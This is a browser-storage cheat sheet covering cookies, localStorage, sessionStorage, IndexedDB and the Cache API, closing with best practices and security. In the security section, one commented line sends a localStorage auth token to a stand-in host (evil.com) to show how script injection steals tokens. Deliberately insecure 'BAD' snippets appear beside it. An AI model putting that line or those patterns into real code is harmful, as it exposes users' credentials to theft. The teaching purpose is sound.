# Browser Storage — Comprehensive Cheat Sheet

---

## Topic Overview

### Definitions

**Core Definition:** Browser storage refers to the various mechanisms provided by web browsers for storing data on the client side, persisting across page reloads, browser sessions, or indefinitely. These include cookies, Web Storage (`localStorage` and `sessionStorage`), IndexedDB, and the Cache API.

**Technical Definition:** Per MDN, the Web Storage API provides mechanisms by which browsers can store key/value pairs in a much more intuitive fashion than using cookies. It includes two mechanisms: `sessionStorage` (maintains a separate storage area for each given origin available for the duration of the page session) and `localStorage` (does the same but persists even when the browser is closed and reopened). Cookies are small pieces of data sent from a website and stored on the user's computer by the web browser while the user is browsing, primarily for session management, personalisation, and tracking. IndexedDB is a low-level API for client-side storage of significant amounts of structured data, including files and blobs, and provides a transactional database system. The Cache API provides a storage mechanism for HTTP responses, commonly used with Service Workers for offline capabilities.

**Beginner-Friendly Explanation:** Browser storage is like different-sized containers your web app can use to remember things. Cookies are tiny notes the browser sends to the server with every request. `localStorage` is a bigger box that stays until you delete it. `sessionStorage` is a box that disappears when you close the tab. IndexedDB is a full database in the browser. The Cache API stores files (like images and scripts) so your app can work offline. Each container has different rules, sizes, and purposes.

### Key Characteristics

- **Persistence:** Different mechanisms have different lifetimes — session-only, persistent until deleted, or persistent until cleared.
- **Capacity:** Ranges from ~4KB (cookies) to hundreds of MB (IndexedDB, Cache API).
- **Scope:** Storage is scoped by origin (protocol + domain + port) for Web Storage, IndexedDB, and Cache API. Cookies can be scoped by domain and path.
- **Synchronous vs asynchronous:** Web Storage and cookies are synchronous; IndexedDB and Cache API are asynchronous (Promise-based).
- **Server visibility:** Cookies are sent to the server with every request; Web Storage and IndexedDB are client-only.
- **Security:** Different mechanisms have different security implications (XSS, CSRF, storage limits).

### Prerequisites

- Understanding of JavaScript basics (objects, arrays, functions, Promises).
- Familiarity with the browser environment and the `window` object.
- Basic knowledge of HTTP (request/response headers).
- Awareness of same-origin policy.

### Related Programming Areas

- **Session management:** Cookies for authentication tokens.
- **Offline-first applications:** IndexedDB and Cache API for offline functionality.
- **Performance:** Caching assets and API responses.
- **User preferences:** Storing settings and theme choices.
- **Security:** Token storage, XSS, CSRF.

---

## Cookies

### Definitions

**Core Definition:** A cookie is a small piece of data (typically under 4KB) that a website stores in the user's browser and that the browser sends back to the server with subsequent requests to the same domain.

**Technical Definition:** Per MDN, an HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to a user's web browser. The browser may store the cookie and send it back to the same server with later requests. Cookies are mainly used for three purposes: session management (logins, shopping carts), personalisation (user preferences, themes), and tracking (recording and analysing user behaviour).

### Purposes

- To manage user sessions (authentication tokens, session IDs).
- To personalise the user experience (theme, language preferences).
- To track user behaviour across sites (analytics, advertising).
- To maintain state across HTTP requests (which are stateless).

### Cookie Creation

**Syntax Rules and Structure:**
```js
document.cookie = "name=value; expires=date; path=/; domain=example.com; secure; samesite=strict";
```

**Component Breakdown:**
- `name=value`: The cookie name and value.
- `expires`: The expiry date in UTC format. If omitted, the cookie is a session cookie.
- `max-age`: Alternative to `expires`; the number of seconds until expiry.
- `path`: The URL path the cookie applies to. Defaults to the current path.
- `domain`: The domain the cookie applies to.
- `secure`: If present, the cookie is only sent over HTTPS.
- `samesite`: Controls cross-site request behaviour (`strict`, `lax`, `none`).
- `httponly`: Prevents JavaScript access (server-set only).

**Annotated Code Example:**
```js
// Step 1: Create a simple cookie.
document.cookie = "username=Alice";

// Step 2: Create a cookie with an expiry date.
const date = new Date();
date.setTime(date.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 days
document.cookie = `username=Alice; expires=${date.toUTCString()}; path=/`;

// Step 3: Create a secure cookie.
document.cookie = "token=abc123; Secure; SameSite=Strict; path=/";

// Step 4: Create a cookie with max-age (in seconds).
document.cookie = "theme=dark; max-age=3600; path=/";
```

**Expected Output:** Cookies are set in the browser and sent with subsequent requests to the same domain and path.

**Why This Output:** Each `document.cookie` assignment creates or updates a cookie. The attributes control its lifetime, scope, and security.

### Cookie Reading

**Definition:** Reading cookies is done by accessing `document.cookie`, which returns a string containing all cookies for the current document, separated by semicolons.

**Annotated Code Example:**
```js
// Step 1: Read all cookies as a string.
console.log(document.cookie);
// "username=Alice; theme=dark; token=abc123"

// Step 2: Parse cookies into an object.
function getCookies() {
  const cookies = {};
  document.cookie.split(";").forEach((cookie) => {
    const [name, value] = cookie.trim().split("=");
    cookies[name] = decodeURIComponent(value);
  });
  return cookies;
}

const allCookies = getCookies();
console.log(allCookies.username); // "Alice"
console.log(allCookies.theme);    // "dark"
```

**Expected Output:**
```
username=Alice; theme=dark; token=abc123
Alice
dark
```

**Why This Output:** `document.cookie` returns all cookies as a single string. Parsing splits the string into name/value pairs.

### Cookie Deletion

**Definition:** Cookies are deleted by setting their `expires` attribute to a date in the past, or by setting `max-age` to `0` or a negative value.

**Annotated Code Example:**
```js
// Step 1: Delete a cookie by expiring it.
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";

// Step 2: Delete with max-age.
document.cookie = "theme=; max-age=0; path=/";
```

**Expected Output:** The cookies are removed from the browser.

**Why This Output:** Setting `expires` to a past date or `max-age` to `0` tells the browser to delete the cookie.

### Cookie Attributes

| Attribute | Description |
|-----------|-------------|
| `expires` | Expiry date in UTC format |
| `max-age` | Expiry in seconds (takes precedence over `expires`) |
| `domain` | Domain the cookie applies to |
| `path` | URL path the cookie applies to |
| `secure` | Only sent over HTTPS |
| `httponly` | Not accessible via JavaScript (server-set only) |
| `samesite` | Cross-site request behaviour (`strict`, `lax`, `none`) |

### Cookie Limits

| Limit | Value |
|-------|-------|
| Max size per cookie | ~4KB |
| Max cookies per domain | ~50 (varies by browser) |
| Total cookies per browser | ~3000 |
| Total cookie size per domain | ~4KB per cookie, ~50 cookies |

### Real-World Cases

- **Session management:** Session IDs and authentication tokens.
- **Personalisation:** Language, theme, and layout preferences.
- **Tracking:** Analytics and advertising identifiers.
- **CSRF tokens:** Security tokens for form submission.

---

## `localStorage`

### Definitions

**Core Definition:** `localStorage` is a Web Storage API that stores key/value pairs persistently in the browser, with no expiration date. Data remains until explicitly deleted by the user or the application.

**Technical Definition:** Per MDN, the `localStorage` read-only property of the `window` interface allows you to access a `Storage` object for the `Document`'s origin; the stored data is saved across browser sessions. `localStorage` is similar to `sessionStorage`, except that while `localStorage` data has no expiration time, `sessionStorage` data gets cleared when the page session ends. Data stored in `localStorage` is specific to the protocol of the page (HTTP vs HTTPS).

### Purposes

- To store user preferences and settings persistently.
- To cache data for offline or performance purposes.
- To maintain application state across sessions.
- To store non-sensitive data that should persist.

### Syntax Rules and Structure

```js
localStorage.setItem(key, value);
localStorage.getItem(key);
localStorage.removeItem(key);
localStorage.clear();
localStorage.key(index);
localStorage.length;
```

### `setItem()`

**Definition:** `setItem()` adds or updates a key/value pair in `localStorage`.

```js
localStorage.setItem("theme", "dark");
localStorage.setItem("fontSize", "16px");
```

### `getItem()`

**Definition:** `getItem()` retrieves the value associated with a key, or `null` if the key does not exist.

```js
const theme = localStorage.getItem("theme"); // "dark"
const missing = localStorage.getItem("missing"); // null
```

### `removeItem()`

**Definition:** `removeItem()` removes a key/value pair from `localStorage`.

```js
localStorage.removeItem("theme");
```

### `clear()`

**Definition:** `clear()` removes all key/value pairs from `localStorage` for the origin.

```js
localStorage.clear();
```

### `key()`

**Definition:** `key()` returns the name of the key at the given index.

```js
const firstKey = localStorage.key(0);
```

### `length`

**Definition:** `length` returns the number of key/value pairs stored.

```js
console.log(localStorage.length);
```

### Storage Events

**Definition:** Storage events are fired on other documents in the same origin when `localStorage` is modified, allowing cross-tab communication.

```js
window.addEventListener("storage", (event) => {
  console.log("Key changed:", event.key);
  console.log("Old value:", event.oldValue);
  console.log("New value:", event.newValue);
});
```

### Storage Limits

| Browser | Limit |
|---------|-------|
| Chrome | 10 MB per origin |
| Firefox | 10 MB per origin |
| Safari | 5 MB per origin |
| Edge | 10 MB per origin |

### Annotated Code Example: Using `localStorage`

```js
// Step 1: Store data.
localStorage.setItem("user", JSON.stringify({ name: "Alice", age: 30 }));
localStorage.setItem("theme", "dark");

// Step 2: Retrieve data.
const user = JSON.parse(localStorage.getItem("user"));
console.log(user.name); // "Alice"

const theme = localStorage.getItem("theme");
console.log(theme); // "dark"

// Step 3: Check if a key exists.
if (localStorage.getItem("theme") !== null) {
  console.log("Theme is set");
}

// Step 4: Remove a key.
localStorage.removeItem("theme");

// Step 5: Clear all.
localStorage.clear();
```

**Expected Output:**
```
Alice
dark
Theme is set
```

**Why This Output:** `localStorage` stores strings. Objects must be serialised with `JSON.stringify` and deserialised with `JSON.parse`.

### Real-World Cases

- **Theme preference:** Storing the user's chosen theme (light/dark).
- **Form data:** Saving form progress so users can resume later.
- **Shopping cart:** Storing cart contents between sessions.
- **Cached API data:** Storing responses for offline use.

---

## `sessionStorage`

### Definitions

**Core Definition:** `sessionStorage` is a Web Storage API that stores key/value pairs for the duration of the page session (until the tab or window is closed).

**Technical Definition:** Per MDN, the `sessionStorage` property of the `window` interface allows you to access a `Storage` object for the `Document`'s origin; the stored data is cleared when the page session ends. A page session lasts as long as the tab or browser is open, and survives over page reloads and restores. Opening multiple tabs/windows with the same URL creates separate `sessionStorage` for each tab/window.

### Purposes

- To store temporary data that should not persist after the tab is closed.
- To maintain state within a single session (e.g., form state, scroll position).
- To isolate data between tabs (each tab has its own `sessionStorage`).

### Syntax Rules and Structure

```js
sessionStorage.setItem(key, value);
sessionStorage.getItem(key);
sessionStorage.removeItem(key);
sessionStorage.clear();
sessionStorage.key(index);
sessionStorage.length;
```

### Annotated Code Example

```js
// Step 1: Store session data.
sessionStorage.setItem("scrollPosition", "450");
sessionStorage.setItem("formStep", "2");

// Step 2: Retrieve session data.
const scrollPos = sessionStorage.getItem("scrollPosition");
console.log(scrollPos); // "450"

// Step 3: Remove on completion.
sessionStorage.removeItem("formStep");
```

**Expected Output:**
```
450
```

**Why This Output:** `sessionStorage` behaves like `localStorage` but persists only for the tab's session.

### Real-World Cases

- **Multi-step forms:** Storing data between steps within a session.
- **Scroll position:** Restoring scroll position after a page reload.
- **Temporary authentication:** Storing session tokens for the duration of the tab.
- **Tab-specific state:** Isolating data between tabs.

---

## IndexedDB

### Definitions

**Core Definition:** IndexedDB is a low-level, asynchronous, transactional, client-side database that allows storing significant amounts of structured data, including files and blobs.

**Technical Definition:** Per MDN, IndexedDB is a low-level API for client-side storage of significant amounts of structured data, including files/blobs. This API uses indexes to enable high-performance searches of this data. While Web Storage is useful for storing smaller amounts of data, it is less useful for storing larger amounts of structured data. IndexedDB provides a solution: a full database system that can store complex objects, query with indexes, and run transactions.

### Purposes

- To store large amounts of structured data (hundreds of MB).
- To enable offline-first applications with complex data.
- To store files and blobs (images, PDFs, audio).
- To perform high-performance queries using indexes.

### Core Concepts

| Concept | Description |
|---------|-------------|
| **Database** | A container for object stores; versioned. |
| **Object Store** | Similar to a table; stores records (objects) with a key. |
| **Transaction** | An atomic unit of work; must be created before any operations. |
| **Index** | A way to look up records by a property other than the primary key. |
| **Cursor** | A mechanism for iterating over multiple records. |
| **Request** | An asynchronous operation (returns a Promise or uses events). |

### Opening a Database

```js
const request = indexedDB.open("MyDatabase", 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  const store = db.createObjectStore("users", { keyPath: "id" });
  store.createIndex("name", "name", { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  console.log("Database opened");
};

request.onerror = (event) => {
  console.error("Database error:", event.target.error);
};
```

### Transactions

```js
const transaction = db.transaction(["users"], "readwrite");
const store = transaction.objectStore("users");

// Add a record:
store.add({ id: 1, name: "Alice", email: "alice@example.com" });

// Handle transaction completion:
transaction.oncomplete = () => console.log("Transaction complete");
transaction.onerror = (event) => console.error(event.target.error);
```

### Object Stores

```js
// Create an object store:
const store = db.createObjectStore("users", { keyPath: "id" });

// Auto-incrementing key:
const store = db.createObjectStore("users", { autoIncrement: true });

// Store with an out-of-line key:
const store = db.createObjectStore("logs");
store.add("log entry", "log-1");
```

### Indexes

```js
// Create an index:
store.createIndex("email", "email", { unique: true });
store.createIndex("age", "age", { unique: false });

// Query using an index:
const index = store.index("email");
const request = index.get("alice@example.com");
request.onsuccess = () => console.log(request.result);
```

### Cursors

```js
const store = db.transaction("users").objectStore("users");
const request = store.openCursor();

request.onsuccess = (event) => {
  const cursor = event.target.result;
  if (cursor) {
    console.log(cursor.value);
    cursor.continue();
  }
};
```

### Queries

```js
// Get a single record by key:
const request = store.get(1);
request.onsuccess = () => console.log(request.result);

// Get all records:
const request = store.getAll();
request.onsuccess = () => console.log(request.result);

// Get with a range:
const range = IDBKeyRange.bound(1, 10);
const request = store.getAll(range);
```

### Annotated Code Example: Full IndexedDB Workflow

```js
// Step 1: Open the database.
const request = indexedDB.open("MyApp", 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  const store = db.createObjectStore("notes", { keyPath: "id", autoIncrement: true });
  store.createIndex("title", "title", { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;

  // Step 2: Add a note.
  const tx = db.transaction("notes", "readwrite");
  const store = tx.objectStore("notes");
  store.add({ title: "First note", content: "Hello, IndexedDB!" });

  tx.oncomplete = () => {
    // Step 3: Read all notes.
    const readTx = db.transaction("notes", "readonly");
    const readStore = readTx.objectStore("notes");
    const getAllRequest = readStore.getAll();

    getAllRequest.onsuccess = () => {
      console.log(getAllRequest.result);
      // [{ id: 1, title: "First note", content: "Hello, IndexedDB!" }]
    };
  };
};
```

**Expected Output:**
```
[ { id: 1, title: 'First note', content: 'Hello, IndexedDB!' } ]
```

**Why This Output:** The database is opened, an object store is created, a record is added in a transaction, and then all records are retrieved.

### Real-World Cases

- **Offline-first apps:** Storing data locally and syncing when online.
- **Progressive Web Apps:** Storing large datasets, images, and files.
- **Caching API responses:** Storing structured API data for offline access.
- **Client-side analytics:** Storing events for later upload.

---

## Cache API

### Definitions

**Core Definition:** The Cache API is a storage mechanism for HTTP responses, allowing developers to cache network requests and serve them later, commonly used with Service Workers for offline capabilities.

**Technical Definition:** Per MDN, the Cache API provides a storage mechanism for HTTP responses, and is part of the Service Worker API. It allows you to store pairs of `Request` and `Response` objects, making it possible to cache assets (HTML, CSS, JS, images) and API responses. The Cache API is exposed through the `caches` global object.

### Purposes

- To cache assets for offline use.
- To improve performance by serving cached responses.
- To implement offline-first Progressive Web Apps (PWAs).
- To control caching strategies (cache-first, network-first, stale-while-revalidate).

### Syntax Rules and Structure

```js
// Open a cache:
const cache = await caches.open("my-cache");

// Add a request/response pair:
await cache.add("/index.html");
await cache.addAll(["/style.css", "/script.js"]);

// Put a custom response:
await cache.put("/api/data", new Response(JSON.stringify(data)));

// Match a request:
const response = await cache.match("/index.html");

// Delete a cache:
await caches.delete("my-cache");

// List all caches:
const cacheNames = await caches.keys();
```

### Annotated Code Example: Caching Assets

```js
// Step 1: Open a cache.
const cache = await caches.open("v1");

// Step 2: Cache assets.
await cache.addAll([
  "/",
  "/index.html",
  "/styles.css",
  "/app.js",
  "/logo.png",
]);

// Step 3: Serve from cache.
const request = new Request("/index.html");
const response = await cache.match(request);

if (response) {
  console.log("Served from cache");
} else {
  console.log("Not in cache");
}
```

**Expected Output:**
```
Served from cache
```

**Why This Output:** The assets are stored in the cache. `cache.match()` retrieves the cached response.

### Real-World Cases

- **Offline web apps:** Serving cached pages when the network is unavailable.
- **PWA asset caching:** Caching the app shell for instant loading.
- **API response caching:** Caching API responses to reduce network requests.
- **Image caching:** Caching images for faster loading.

---

## Storage Best Practices

### Definitions

**Core Definition:** Storage best practices are guidelines for choosing and using browser storage mechanisms effectively, securely, and performantly.

### Key Practices

**1. Choose the Right Storage Mechanism**

| Use Case | Recommended Storage |
|----------|-------------------|
| Session tokens | Cookies (HttpOnly, Secure, SameSite) |
| User preferences | `localStorage` |
| Temporary session data | `sessionStorage` |
| Large structured data | IndexedDB |
| Offline assets | Cache API |
| Sensitive data | Never in client-side storage |

**2. Never Store Sensitive Data in Client-Side Storage**

```js
// BAD: Storing a password or credit card in localStorage.
localStorage.setItem("password", "secret");

// GOOD: Store a session token in an HttpOnly cookie (set by the server).
// The cookie is not accessible via JavaScript.
```

**3. Use HttpOnly and Secure Cookies for Tokens**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
```

**4. Handle Storage Quota Exceeded**

```js
try {
  localStorage.setItem("largeData", bigString);
} catch (error) {
  if (error.name === "QuotaExceededError") {
    console.error("Storage quota exceeded");
    // Clean up old data or notify the user
  }
}
```

**5. Clear Data When No Longer Needed**

```js
// Remove expired items.
function cleanExpired() {
  const now = Date.now();
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const item = JSON.parse(localStorage.getItem(key));
    if (item.expires && item.expires < now) {
      localStorage.removeItem(key);
    }
  }
}
```

**6. Use Storage Events for Cross-Tab Communication**

```js
window.addEventListener("storage", (event) => {
  if (event.key === "theme") {
    applyTheme(event.newValue);
  }
});
```

**7. Consider IndexedDB for Large Data**

```js
// localStorage has a ~5-10 MB limit.
// IndexedDB can store hundreds of MB or more.
```

**8. Cache API for Offline Assets**

```js
// Use the Cache API in a Service Worker for offline support.
```

**9. Sanitise Data Read from Storage**

```js
// BAD: Trusting data from localStorage.
const userInput = localStorage.getItem("input");
element.innerHTML = userInput; // XSS risk!

// GOOD: Sanitise or use textContent.
element.textContent = userInput;
```

**10. Handle Private Browsing Restrictions**

```js
// Some browsers restrict localStorage in private mode.
try {
  localStorage.setItem("test", "test");
  localStorage.removeItem("test");
} catch (error) {
  console.warn("localStorage is not available");
}
```

### Real-World Cases

- **Authentication:** Using HttpOnly cookies for session tokens.
- **Preferences:** Using `localStorage` for theme and language.
- **Offline apps:** Using IndexedDB and Cache API.
- **Multi-tab sync:** Using storage events to sync state across tabs.

---

## Storage Security

### Definitions

**Core Definition:** Storage security refers to the practices and considerations for protecting data stored in browser storage mechanisms from unauthorised access, theft, or manipulation.

### Key Security Considerations

| Threat | Description | Mitigation |
|--------|-------------|------------|
| **XSS** | Malicious scripts can read `localStorage` and `sessionStorage` | Use HttpOnly cookies for tokens; sanitise input; use CSP |
| **CSRF** | Malicious sites can trigger authenticated requests | Use SameSite cookies; CSRF tokens |
| **Data theft** | Stolen devices or browser profiles can expose data | Encrypt sensitive data; use short-lived tokens |
| **Storage quota exhaustion** | Malicious scripts can fill storage | Handle `QuotaExceededError`; limit data stored |
| **Cross-tab leakage** | Data in one tab visible to others (same origin) | Use `sessionStorage` for tab-specific data |

### XSS and Storage

```js
// BAD: Tokens in localStorage are accessible to any script.
localStorage.setItem("authToken", "secret-token");
// If an attacker injects a script, they can steal the token:
// fetch("https://evil.com/steal?token=" + localStorage.getItem("authToken"));

// GOOD: Use HttpOnly cookies for authentication tokens.
// The server sets: Set-Cookie: token=secret; HttpOnly; Secure; SameSite=Strict
// JavaScript cannot access HttpOnly cookies.
```

### CSRF and Cookies

```js
// SameSite=Strict prevents the cookie from being sent on cross-site requests.
// SameSite=Lax allows GET requests from other sites (e.g., links).
// SameSite=None requires Secure and allows cross-site requests (for embedded content).
```

### Content Security Policy (CSP)

```html
<!-- Restrict where scripts can be loaded from. -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://trusted.cdn.com">
```

### Real-World Cases

- **Authentication tokens:** HttpOnly, Secure, SameSite cookies.
- **User preferences:** Non-sensitive data in `localStorage`.
- **Offline data:** IndexedDB with encryption for sensitive data.
- **Third-party scripts:** Use CSP to restrict their access.

---

## References

- MDN Web Docs – Web Storage API — https://mdn.org.cn/en-US/docs/Web/API/Web_Storage_API
- MDN Web Docs – Window: localStorage — https://mdn.org.cn/en-US/docs/Web/API/Window/localStorage
- MDN Web Docs – Window: sessionStorage — https://mdn.org.cn/en-US/docs/Web/API/Window/sessionStorage
- MDN Web Docs – Storage — https://mdn.org.cn/en-US/docs/Web/API/Storage
- MDN Web Docs – IndexedDB API — https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
- MDN Web Docs – Cache — https://developer.mozilla.org/en-US/docs/Web/API/Cache
- MDN Web Docs – HTTP cookies — https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Cookies
- MDN Web Docs – Document: cookie — https://mdn.org.cn/en-US/docs/Web/API/Document/cookie
- MDN Web Docs – Using IndexedDB — https://mdn.org.cn/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB
- MDN Web Docs – Storage quotas and eviction criteria — https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria
- OWASP – HTML5 Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- OWASP – Cross-Site Scripting Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP – Cross-Site Request Forgery Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- W3C – Indexed Database API 3.0 — https://www.w3.org/TR/IndexedDB/
- WHATWG – Storage Standard — https://storage.spec.whatwg.org/
- WHATWG – HTML Living Standard (Web Storage) — https://html.spec.whatwg.org/multipage/webstorage.html
- Chrome for Developers – Storage for the web — https://web.dev/storage-for-the-web/
- ECMAScript Language Specification (ECMA-262, 16th Edition, June 2025) — https://ecma-international.org/wp-content/uploads/ECMA-262_16th_edition_june_2025.pdf